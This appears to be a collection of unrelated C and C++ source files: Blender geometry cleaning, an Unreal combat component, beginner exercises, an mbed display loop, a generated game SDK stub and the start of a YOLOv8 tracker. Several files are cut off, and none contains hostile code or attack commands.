    "/* SPDX-FileCopyrightText: 2012-2022 Blender Authors\n *\n * SPDX-License-Identifier: GPL-2.0-or-later */\n\n/** \\file\n * \\ingroup freestyle\n * \\brief Class to define a cleaner of geometry providing a set of useful tools\n */\n\n#if 0\n#  if defined(__GNUC__) && (__GNUC__ >= 3)\n// hash_map is not part of the C++ standard anymore;\n// hash_map.h has been kept though for backward compatibility\n#    include <hash_map.h>\n#  else\n#    include <hash_map>\n#  endif\n#endif\n\n#include <cstdio>\n#include <list>\n#include <map>\n\n#include \"GeomCleaner.h\"\n\n#include \"../system/TimeUtils.h\"\n\n#include \"BKE_global.h\"\n\n#include \"BLI_sys_types.h\"\n\nusing namespace std;\n\nnamespace Freestyle {\n\nvoid GeomCleaner::SortIndexedVertexArray(const float *iVertices,\n                                         uint iVSize,\n                                         const uint *iIndices,\n                                         uint iISize,\n                                         float **oVertices,\n                                         uint **oIndices)\n{\n  // First, we build a list of IndexVertex:\n  list<IndexedVertex> indexedVertices;\n  uint i;\n  for (i = 0; i < iVSize; i += 3) {\n    indexedVertices.emplace_back(Vec3f(iVertices[i], iVertices[i + 1], iVertices[i + 2]), i / 3);\n  }\n\n  // q-sort\n  indexedVertices.sort();\n\n  // build the indices mapping array:\n  uint *mapIndices = new uint[iVSize / 3];\n  *oVertices = new float[iVSize];\n  list<IndexedVertex>::iterator iv;\n  uint newIndex = 0;\n  uint vIndex = 0;\n  for (iv = indexedVertices.begin(); iv != indexedVertices.end(); iv++) {\n    // Build the final results:\n    (*oVertices)[vIndex] = iv->x();\n    (*oVertices)[vIndex + 1] = iv->y();\n    (*oVertices)[vIndex + 2] = iv->z();\n\n    mapIndices[iv->index()] = newIndex;\n    newIndex++;\n    vIndex += 3;\n  }\n\n  // Build the final index array:\n  *oIndices = new uint[iISize];\n  for (i = 0; i < iISize; i++) {\n    (*oIndices)[i] = 3 * mapIndices[iIndices[i] / 3];\n  }\n\n  delete[] mapIndices;\n}\n\nvoid GeomCleaner::CompressIndexedVertexArray(const float *iVertices,\n                                             uint iVSize,\n                                             const uint *iIndices,\n                                             uint iISize,\n                                             float **oVertices,\n                                             uint *oVSize,\n                                             uint **oIndices)\n{\n  // First, we build a list of IndexVertex:\n  vector<Vec3f> vertices;\n  uint i;\n  for (i = 0; i < iVSize; i += 3) {\n    vertices.emplace_back(iVertices[i], iVertices[i + 1], iVertices[i + 2]);\n  }\n\n  uint *mapVertex = new uint[iVSize];\n  vector<Vec3f>::iterator v = vertices.begin();\n\n  vector<Vec3f> compressedVertices;\n  Vec3f previous = *v;\n  mapVertex[0] = 0;\n  compressedVertices.push_back(vertices.front());\n\n  v++;\n  Vec3f current;\n  i = 1;\n  for (; v != vertices.end(); v++) {\n    current = *v;\n    if (current == previous) {\n      mapVertex[i] = compressedVertices.size() - 1;\n    }\n    else {\n      compressedVertices.push_back(current);\n      mapVertex[i] = compressedVertices.size() - 1;\n    }\n    previous = current;\n    i++;\n  }\n\n  // Builds the resulting vertex array:\n  *oVSize = 3 * compressedVertices.size();\n  *oVertices = new float[*oVSize];\n  i = 0;\n  for (v = compressedVertices.begin(); v != compressedVertices.end(); v++) {\n    (*oVertices)[i] = (*v)[0];\n    (*oVertices)[i + 1] = (*v)[1];\n    (*oVertices)[i + 2] = (*v)[2];\n    i += 3;\n  }\n\n  // Map the index array:\n  *oIndices = new uint[iISize];\n  for (i = 0; i < iISize; i++) {\n    (*oIndices)[i] = 3 * mapVertex[iIndices[i] / 3];\n  }\n\n  delete[] mapVertex;\n}\n\nvoid GeomCleaner::SortAndCompressIndexedVertexArray(const float *iVertices,\n                                                    uint iVSize,\n                                                    const uint *iIndices,\n                                                    uint iISize,\n                                                    float **oVertices,\n                                                    uint *oVSize,\n                                                    uint **oIndices)\n{\n  // tmp arrays used to store the sorted data:\n  float *tmpVertices;\n  uint *tmpIndices;\n\n  Chronometer chrono;\n  // Sort data\n  chrono.start();\n  GeomCleaner::SortIndexedVertexArray(\n      iVertices, iVSize, iIndices, iISize, &tmpVertices, &tmpIndices);\n  if (G.debug & G_DEBUG_FREESTYLE) {\n    printf(\"Sorting: %lf sec.\\n\", chrono.stop());\n  }\n\n  // compress data\n  chrono.start();\n  GeomCleaner::CompressIndexedVertexArray(\n      tmpVertices, iVSize, tmpIndices, iISize, oVertices, oVSize, oIndices);\n  real duration = chrono.stop();\n  if (G.debug & G_DEBUG_FREESTYLE) {\n    printf(\"Merging: %lf sec.\\n\", duration);\n  }\n\n  // deallocates memory:\n  delete[] tmpVertices;\n  delete[] tmpIndices;\n}\n\n/** Defines a hash table used for searching the Cells */\nstruct GeomCleanerHasher {\n#define _MUL 950706376UL\n#define _MOD 2147483647UL\n  inline size_t operator()(",
    "// Created by Brandon Davis\n\n\n#include \"Components/CombatComponent.h\"\n\n#include \"Character/MMCharacter.h\"\n#include \"Engine/SkeletalMeshSocket.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"Net/UnrealNetwork.h\"\n#include \"Weapon/Weapon.h\"\n\nUCombatComponent::UCombatComponent()\n{\n\t// Set this component to be initialized when the game starts, and to be ticked every frame.  You can turn these features\n\t// off to improve performance if you don't need them.\n\tPrimaryComponentTick.bCanEverTick = false;\n\n\tBaseWalkSpeed = 600.f;\n\tAimWalkSpeed = 450.f;\n}\n\n\n// Called when the game starts\nvoid UCombatComponent::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\tif(Character)\n\t{\n\t\tCharacter->GetCharacterMovement()->MaxWalkSpeed = BaseWalkSpeed;\n\t}\n\t\n}\n\n// Called every frame\nvoid UCombatComponent::TickComponent(float DeltaTime, ELevelTick TickType, FActorComponentTickFunction* ThisTickFunction)\n{\n\tSuper::TickComponent(DeltaTime, TickType, ThisTickFunction);\n\n\t// ...\n}\n\nvoid UCombatComponent::GetLifetimeReplicatedProps(TArray<FLifetimeProperty>& OutLifetimeProps) const\n{\n\tSuper::GetLifetimeReplicatedProps(OutLifetimeProps);\n\n\tDOREPLIFETIME(UCombatComponent, EquippedWeapon);\n\tDOREPLIFETIME(UCombatComponent, bAiming);\n}\n\nvoid UCombatComponent::EquipWeapon(AWeapon* WeaponToEquip)\n{\n\tif (!Character || !WeaponToEquip) return;\n\n\t// Equip and change the state of the weapon\n\tEquippedWeapon = WeaponToEquip;\n\tEquippedWeapon->SetWeaponState(EWeaponState::EWS_Equipped);\n\n\t// Get the socket and attach weapon to it;\n\tUSkeletalMeshSocket const* HandSocket = Character->GetMesh()->GetSocketByName(FName(\"RightHandSocket\"));\n\tif(HandSocket)\n\t{\n\t\tHandSocket->AttachActor(EquippedWeapon, Character->GetMesh());\n\t}\n\n\t// Set new owner and disable pickup widget\n\tEquippedWeapon->SetOwner(Character);\n\tCharacter->GetCharacterMovement()->bOrientRotationToMovement = false;\n\tCharacter->bUseControllerRotationYaw = true;\n\n}\n\nvoid UCombatComponent::OnRep_EquippedWeapon()\n{\n\tif (EquippedWeapon && Character)\n\t{\n\t\tCharacter->GetCharacterMovement()->bOrientRotationToMovement = false;\n\t\tCharacter->bUseControllerRotationYaw = true;\n\t}\n}\n\nvoid UCombatComponent::SetAiming(bool bIsAiming)\n{\n\t// Set immediately so client doesn't have to wait for the RPC\n\tbAiming = bIsAiming;\n\t// Server RPC runs on the server whether you call it from a server or client\n\tServerSetAiming(bIsAiming);\n\tif(Character)\n\t{\n\t\tCharacter->GetCharacterMovement()->MaxWalkSpeed = bIsAiming ? AimWalkSpeed : BaseWalkSpeed;\n\t}\n}\n\nvoid UCombatComponent::ServerSetAiming_Implementation(bool bIsAiming)\n{\n\tbAiming = bIsAiming;\n\tif (Character)\n\t{\n\t\tCharacter->GetCharacterMovement()->MaxWalkSpeed = bIsAiming ? AimWalkSpeed : BaseWalkSpeed;\n\t}\n}\n\n\n\n",
    "#include<stdio.h>\nvoid funcmul(int*,int*,int*);\nvoid funcdiv(int*,int*,int*);\nvoid funcadd(int*,int*,int*);\nvoid funcsub(int*,int*,int*);\nint main()\n{\n    int mul,sub,div,add;\n     int n1,n2;\n     char op;\n     printf(\"Enter your  first Number :\\n\");\n     scanf(\"%d\",&n1);\n      printf(\"Enter The Operator(*,-,+,/):\\n\");\n     scanf(\" %c\",&op);\n     printf(\"Enter your Second Number:\\n\");\n     scanf(\"%d\",&n2);\n\n\n     if(op=='*'){\n        funcmul(&n1,&n2,&mul);\n        printf(\"Multiplication=%d\",mul);\n        return 0;\n     }if(op=='/'){\n       funcdiv(&n1,&n2,&div);\n         printf(\"Division=%d\",div);\n         return 0;\n     }if(op=='+'){\n      funcadd(&n1,&n2,&add);\n        printf(\"Addition=%d\",add);\n        return 0;\n     }if(op=='-'){\n      funcsub(&n1,&n2,&sub);\n        printf(\"Subtraction=%d\",sub);\n        return 0;\n     }else{\n       printf(\"Invalid\");\n       return 0;\n     }\n\n}\nvoid funcmul(int* n1,int* n2,int* mul){\n\n      *mul=*n1 * *n2;\n}\nvoid funcadd(int* n1,int* n2,int* add){\n\n      *add=*n1 + *n2;\n}\n\nvoid funcsub(int* n1,int* n2,int* sub){\n\n      *sub=*n1 - *n2;\n}\n\nvoid funcdiv(int* n1,int* n2,int* div){\n\n      *div=*n1 / *n2;\n}\n\n\n\n\n",
    "#include \"studentRecord.h\"\n#include \"not_found_err.h\"\n\n// constructor with default values\nStudentRecord::StudentRecord() {\n  this->id = 0;\n  this->name = \"INVALID\";\n  this->age = 0;\n}\n\n// overloaded constructor with id specified\nStudentRecord::StudentRecord(int id) {\n  this->id = id;\n  this->name = \"INVALID\";\n  this->age = 0;\n}\n\n// overloaded constructor with id and name specified\nStudentRecord::StudentRecord(int id, std::string name) {\n  this->id = id;\n  this->name = name;\n  this->age = 0;\n}\n\n// overloaded constructor with id, name and age specified\nStudentRecord::StudentRecord(int id, std::string name, int age) {\n  this->id = id;\n  this->name = name;\n  this->age = age;\n}\n\n// create a student record and push back the pointer to the vector in argument\n// function is > 80 chars, but I dunno how to make it look good split...\nvoid StudentRecord::addRecord(int id, std::string name, int age, std::vector<StudentRecord*>& allRecords) {\n  StudentRecord* record = new StudentRecord(id, name, age);\n  allRecords.push_back(record);\n\n}\n\n// find and fetch a specific record and return the pointer to the record in\n// function is > 80 chars, but I dunno how to make it look good split...\nStudentRecord* StudentRecord::fetchRecord(int id, std::vector<StudentRecord*>& allRecords) {\n  for (auto i : allRecords) {\n    if (i->id == id)\n      return i;\n  }\n  // throw if not found\n  throw (not_found_err());\n}\n\n//--------------getters------------------------\n\nint StudentRecord::getId() {\n  return this->id;\n}\n\nstd::string StudentRecord::getName() {\n  return this->name;\n}\n\nint StudentRecord::getAge() {\n  return this->age;\n}",
    "/*\n420\u3001\u5c0f\u660e\u7684\u5e78\u8fd0\u6570 / \u6700\u5927\u5750\u6807\u503c\n\u9898\u76ee\u63cf\u8ff0\uff1a\n\u5c0f\u660e\u5728\u73a9\u4e00\u4e2a\u6e38\u620f\uff0c\u6e38\u620f\u89c4\u5219\u5982\u4e0b\uff1a\n\u5728\u6e38\u620f\u5f00\u59cb\u524d\uff0c\u5c0f\u660e\u7ad9\u5728\u5750\u6807\u8f74\u539f\u70b9\u5904\uff08\u5750\u6807\u503c\u4e3a0\uff09\u3002\n\u7ed9\u5b9a\u4e00\u7ec4\u6307\u4ee4\u548c\u4e00\u4e2a\u5e78\u8fd0\u6570\uff0c\u6bcf\u4e2a\u6307\u4ee4\u90fd\u662f\u4e00\u4e2a\u6574\u6570\uff0c\u5c0f\u660e\u6309\u7167\u6307\u5b9a\u7684\u8981\u6c42\u524d\u8fdb\u6216\u8005\u540e\u9000\u6307\u5b9a\u7684\u6b65\u6570\u3002\u524d\u8fdb\u4ee3\u8868\u671d\u5750\u6807\u8f74\u7684\u6b63\u65b9\u5411\u8d70\uff0c\u540e\u9000\u4ee3\u8868\u671d\u5750\u6807\u8f74\u7684\u8d1f\u65b9\u5411\u8d70\u3002\n\u5e78\u8fd0\u6570\u4e3a\u4e00\u4e2a\u6574\u6570\uff0c\u5982\u679c\u67d0\u4e2a\u6307\u4ee4\u6b63\u597d\u548c\u5e78\u8fd0\u6570\u76f8\u7b49\uff0c\u5219\u5c0f\u660e\u884c\u8fdb\u6b65\u6570\u52a01\u3002\n\n\u4f8b\u5982\uff1a\n\u5e78\u8fd0\u6570\u4e3a3\uff0c\u6307\u4ee4\u4e3a[2,3,0,-5]\n\u6307\u4ee4\u4e3a2\uff0c\u8868\u793a\u524d\u8fdb2\u6b65\uff1b\n\u6307\u4ee4\u4e3a3\uff0c\u6b63\u597d\u548c\u5e78\u8fd0\u6570\u76f8\u7b49\uff0c\u524d\u8fdb3+1=4\u6b65\uff1b\n\u6307\u4ee4\u4e3a0\uff0c\u8868\u793a\u539f\u5730\u4e0d\u52a8\uff0c\u65e2\u4e0d\u524d\u8fdb\uff0c\u4e5f\u4e0d\u540e\u9000\u3002\n\u6307\u4ee4\u4e3a-5\uff0c\u8868\u793a\u540e\u90005\u6b65\uff1b\n\n\u8bf7\u4f60\u8ba1\u7b97\u5c0f\u660e\u5728\u6574\u4e2a\u6e38\u620f\u8fc7\u7a0b\u4e2d\uff0c\u5c0f\u660e\u6240\u5904\u7684\u6700\u5927\u5750\u6807\u503c\u3002\n\n\u8f93\u5165\u63cf\u8ff0\uff1a\n\u7b2c\u4e00\u884c\u8f93\u51651\u4e2a\u6570\u5b57\uff0c\u4ee3\u8868\u6307\u4ee4\u7684\u603b\u4e2a\u6570n\uff081<=n<=100\uff09\u3002\n\u7b2c\u4e8c\u884c\u8f93\u51651\u4e2a\u6570\u5b57\uff0c\u4ee3\u8868\u5e78\u8fd0\u6570m\uff08-100<=m<=100\uff09\n\u7b2c\u4e09\u884c\u8f93\u5165n\u4e2a\u6307\u4ee4\uff0c\u6bcf\u4e2a\u6307\u4ee4\u503c\u7684\u53d6\u503c\u8303\u56f4\u4e3a\uff1a-100<=\u6307\u4ee4\u503c<=100\u3002\n\n\u8f93\u51fa\u63cf\u8ff0\uff1a\n\u8f93\u51fa\u5728\u6574\u4e2a\u6e38\u620f\u8fc7\u7a0b\u4e2d\uff0c\u5c0f\u660e\u6240\u5904\u7684\u6700\u5927\u5750\u6807\u503c\u3002\u5f02\u5e38\u60c5\u51b5\u4e0b\u8f93\u51fa\uff1a12345\n\n\u793a\u4f8b1\n\u8f93\u5165\uff1a\n2\n1\n-5 1\n\u8f93\u51fa\uff1a\n0\n\u8bf4\u660e\uff1a\n\u603b\u51712\u4e2a\u6307\u4ee4\uff0c\u5e78\u8fd0\u6570\u4e3a1\uff0c\u4f9d\u7167\u6307\u4ee4\u884c\u8fdb\uff0c\u4f9d\u6b21\u5982\u4e0b\uff1a\n\u6e38\u620f\u5f00\u59cb\u524d\uff0c\u7ad9\u5728\u5750\u6807\u8f74\u539f\u70b9\uff0c\u6b64\u65f6\u5750\u6807\u503c\u4e3a0\uff1b\n\u6307\u4ee4\u4e3a-5\uff0c\u540e\u90005\u6b65\uff0c\u6b64\u65f6\u5750\u6807\u503c\u4e3a-5\uff1b\n\u6307\u4ee4\u4e3a1\uff0c\u6b63\u597d\u7b49\u4e8e\u5e78\u8fd0\u6570\uff0c\u524d\u8fdb1+1=2\u6b65\uff0c\u6b64\u65f6\u5750\u6807\u503c\u4e3a-3\uff1b\n\u6574\u4e2a\u6e38\u620f\u8fc7\u7a0b\u4e2d\uff0c\u5c0f\u660e\u6240\u5904\u7684\u5750\u6807\u503c\u4f9d\u6b21\u4e3a[0,-5,-3]\uff0c\u6700\u5927\u5750\u6807\u503c\u4e3a0\u3002\n\n\u793a\u4f8b2\n\u8f93\u5165\uff1a\n5\n-5\n-5 1 6 0 -7\n\u8f93\u51fa\uff1a\n1\n\u8bf4\u660e\uff1a\n\u603b\u51715\u4e2a\u6307\u4ee4\uff0c\u5e78\u8fd0\u6570\u4e3a-5\uff0c\u4f9d\u7167\u6307\u4ee4\u884c\u8fdb\uff0c\u4f9d\u6b21\u5982\u4e0b\uff1a\n\u6e38\u620f\u5f00\u59cb\u524d\uff0c\u7ad9\u5728\u5750\u6807\u8f74\u539f\u70b9\uff0c\u6b64\u65f6\u5750\u6807\u503c\u4e3a0\uff1b\n\u6307\u4ee4\u4e3a-5\uff0c\u6b63\u597d\u7b49\u4e8e\u5e78\u8fd0\u6570\uff0c\u540e\u90005+1=6\u6b65\uff0c\u6b64\u65f6\u5750\u6807\u503c\u4e3a-6\uff1b\n\u6307\u4ee4\u4e3a1\uff0c\u524d\u8fdb1\u6b65\uff0c\u6b64\u65f6\u5750\u6807\u503c\u4e3a-5\uff1b\n\u6307\u4ee4\u4e3a6\uff0c\u524d\u8fdb6\u6b65\uff0c\u6b64\u65f6\u5750\u6807\u503c\u4e3a1\uff1b\n\u6307\u4ee4\u4e3a0\uff0c\u65e2\u4e0d\u524d\u8fdb\uff0c\u4e5f\u4e0d\u540e\u9000\uff0c\u6b64\u65f6\u5750\u6807\u503c\u4e3a1\uff1b\n\u6307\u4ee4\u4e3a-7\uff0c\u540e\u90007\u6b65\uff0c\u6b64\u65f6\u5750\u6807\u503c\u4e3a-6\uff1b\n\u6574\u4e2a\u6e38\u620f\u8fc7\u7a0b\u4e2d\uff0c\u5c0f\u660e\u6240\u5904\u7684\u5750\u6807\u503c\u4f9d\u6b21\u4e3a[0,-6,-5,1,1,-6]\uff0c\u6700\u5927\u5750\u6807\u503c\u4e3a1\u3002\n*/\n\n#include<iostream>\n#include<vector>\n\n\nusing namespace std;\n\nint main()\n{\n\tint n, m;\n\tcin >> n >> m;\n\tvector<int> order(n);\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcin >> order[i];\n\t}\n\tint count = 0;\n\tint max_n = 0;\n\tfor (auto i : order)\n\t{\n\t\tif (i == m)\n\t\t{\n\t\t\tif (m < 0)\n\t\t\t{\n\t\t\t\tcount += m - 1;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcount += m + 1;\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tcount += i;\n\t\t}\n\t\tmax_n = max(max_n, count);\n\t}\n\tcout << max_n;\n}",
    "/*Para un grupo de clase de 8 estudiantes, realice un programa que\npermita calcular y dar como salida lo siguiente:\n\u2713 Cantidad de alumnos aprobados\n\u2713 Cantidad de alumnos reprobados\n\u2713 Promedio general del grupo*/\n\n#include <iostream>\n#include <iomanip>\n\nusing namespace std;\n\nvoid calcularPromedio(float notas[], int n, int& aprobados, int& reprobados, float& promedio);\n\nint main()\n{\n    const int n = 10;\n    float notas[n];\n    int aprobados, reprobados;\n    float promedio;\n    for (int i = 0; i < n; i++)\n    {\n        cout << \"Digite la nota del estudiante \" << i+1 << \": \";\n        cin >> notas[i];\n    }\n    calcularPromedio(notas, n, aprobados, reprobados, promedio);\n    cout << \"La cantidad de alumnos aprobados es de \" << aprobados << endl;\n    cout << \"La cantidad de alumnos reprobados es de \" << reprobados << endl;\n    cout << \"El promedio de los 10 estudiantes es \" << fixed << setprecision(2) << promedio << endl;\n    return 0;\n}\n\nvoid calcularPromedio(float notas[], int n, int& aprobados, int& reprobados, float& promedio){\n    float suma=0;\n    for (int i = 0; i < n; i++)\n    {\n        suma += notas[i];\n        if (notas[i] >= 70)\n        {\n            aprobados += 1;\n        }\n        else\n        {\n            reprobados += 1;\n        }\n    }\n    promedio=suma/n;\n}",
    "#if 0\n#include \"mbed.h\"\n\nDigitalOut clk(ARDUINO_UNO_D7);\nDigitalOut data(ARDUINO_UNO_D8);\nDigitalOut store(ARDUINO_UNO_D4);\nDigitalOut buzzer(PB_3,1);         // D3 Buzzer ausschalten\n\nint main()\n{\n \n    while(1){\n        // 4 rechts ausgeben\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        store=0;\n        store=1;\n        ThisThread::sleep_for(1ms);\n\n        // 3 mitte rechts ausgeben\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        \n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        store=0;\n        store=1;\n        ThisThread::sleep_for(1ms);\n\n        // 2 mitte links ausgeben\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        \n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        store=0;\n        store=1;\n        ThisThread::sleep_for(1ms);\n\n\n        // 1 ganz links ausgeben\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        \n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 0;\n        clk = 0;\n        clk = 1;\n        data = 1;\n        clk = 0;\n        clk = 1;\n        store=0;\n        store=1;\n        ThisThread::sleep_for(1ms);\n    }\n}\n#endif",
    "#pragma once\n\n// Dumped with Dumper-7!\n\n\n#include \"../SDK.hpp\"\n\nnamespace SDK\n{\n//---------------------------------------------------------------------------------------------------------------------\n// FUNCTIONS\n//---------------------------------------------------------------------------------------------------------------------\n\n\n// BlueprintGeneratedClass DA_Butterfly.DA_Butterfly_C\n// (Actor)\n\nclass UClass* ADA_Butterfly_C::StaticClass()\n{\n\tstatic class UClass* Clss = nullptr;\n\n\tif (!Clss)\n\t\tClss = UObject::FindClassFast(\"DA_Butterfly_C\");\n\n\treturn Clss;\n}\n\n\n// DA_Butterfly_C DA_Butterfly.Default__DA_Butterfly_C\n// (Public, ClassDefaultObject, ArchetypeObject, WasLoaded, LoadCompleted)\n\nclass ADA_Butterfly_C* ADA_Butterfly_C::GetDefaultObj()\n{\n\tstatic class ADA_Butterfly_C* Default = nullptr;\n\n\tif (!Default)\n\t\tDefault = static_cast<ADA_Butterfly_C*>(ADA_Butterfly_C::StaticClass()->DefaultObject);\n\n\treturn Default;\n}\n\n\n// Function DA_Butterfly.DA_Butterfly_C.BPPressSecondaryFire\n// (Event, Public, BlueprintEvent)\n// Parameters:\n// class AFortDecoHelper*             FortDecoHelper                                                   (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid ADA_Butterfly_C::BPPressSecondaryFire(class AFortDecoHelper* FortDecoHelper)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"DA_Butterfly_C\", \"BPPressSecondaryFire\");\n\n\tParams::ADA_Butterfly_C_BPPressSecondaryFire_Params Parms{};\n\n\tParms.FortDecoHelper = FortDecoHelper;\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n}\n\n\n// Function DA_Butterfly.DA_Butterfly_C.BPPressTrigger\n// (Event, Public, BlueprintEvent)\n// Parameters:\n// class AFortDecoHelper*             FortDecoHelper                                                   (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid ADA_Butterfly_C::BPPressTrigger(class AFortDecoHelper* FortDecoHelper)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"DA_Butterfly_C\", \"BPPressTrigger\");\n\n\tParams::ADA_Butterfly_C_BPPressTrigger_Params Parms{};\n\n\tParms.FortDecoHelper = FortDecoHelper;\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n}\n\n\n// Function DA_Butterfly.DA_Butterfly_C.BPOnUnEquip\n// (Event, Public, BlueprintEvent)\n// Parameters:\n\nvoid ADA_Butterfly_C::BPOnUnEquip()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"DA_Butterfly_C\", \"BPOnUnEquip\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function DA_Butterfly.DA_Butterfly_C.BPReleaseSecondaryFire\n// (Event, Public, BlueprintEvent)\n// Parameters:\n// class AFortDecoHelper*             FortDecoHelper                                                   (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid ADA_Butterfly_C::BPReleaseSecondaryFire(class AFortDecoHelper* FortDecoHelper)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"DA_Butterfly_C\", \"BPReleaseSecondaryFire\");\n\n\tParams::ADA_Butterfly_C_BPReleaseSecondaryFire_Params Parms{};\n\n\tParms.FortDecoHelper = FortDecoHelper;\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n}\n\n\n// Function DA_Butterfly.DA_Butterfly_C.ExecuteUbergraph_DA_Butterfly\n// (Final, UbergraphFunction, HasDefaults)\n// Parameters:\n// int32                              EntryPoint                                                       (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n// class AFortDecoHelper*             K2Node_Event_FortDecoHelper_2                                    (ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n// class APawn*                       CallFunc_GetInstigator_ReturnValue                               (ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n// struct FGameplayEventData          K2Node_MakeStruct_GameplayEventData                              (None)\n// class AFortDecoHelper*             K2Node_Event_FortDecoHelper_1                                    (ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n// class AFortDecoHelper*             K2Node_Event_FortDecoHelper                                      (ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid ADA_Butterfly_C::ExecuteUbergraph_DA_Butterfly(int32 EntryPoint, class AFortDecoHelper* K2Node_Event_FortDecoHelper_2, class APawn* CallFunc_GetInstigator_ReturnValue, const struct FGameplayEventData& K2Node_MakeStruct_GameplayEventData, class AFortDecoHelper* K2Node_Event_FortDecoHelper_1, class AFortDecoHelper* K2Node_Event_FortDecoHelper)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"DA_Butterfly_C\", \"ExecuteUbergraph_DA_Butterfly\");\n\n\tParams::ADA_Butterfly_C_ExecuteUbergraph_DA_Butterfly_Params Parms{};\n\n\tParms.EntryPoint = Ent",
    "#include \"yolov8.hpp\"\n#include \"NvInfer.h\"\n#include \"cuda_runtime_api.h\"\n#include \"logging.h\"\n#include \"BYTETracker.h\"\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <numeric>\n#include <chrono>\n#include <vector>\n#include <opencv2/opencv.hpp>\n#include <dirent.h>\n#include <opencv2/imgproc.hpp>\n#include <opencv2/highgui.hpp>\n#include \"util.h\"\n#include <cstring>\n#include <unistd.h>\n\nusing namespace std;\nusing namespace cv;\n\nint main(int argc, char** argv) {\n    // Read command line arguments\n    const string engine_file_path{argv[1]};\n    const string input_type{argv[2]};\n    string input_value;\n    int infer_rate;\n    string output_type;\n    string ssh;\n    string pipeline;\n\n    // Variables for video processing\n    vector<string> imagePathList;\n    bool isVideo{false};\n    bool isCamera{false};\n    string new_filename;\n\n    int frame_count = 0;\n    int infer_frame_count = 0;\n    int total_ms = 0;\n    map<string, int> classCounts_IN;\n    map<string, int> classCounts_OUT;\n\n    vector<int> crossedTrackerIds;\n\n    // 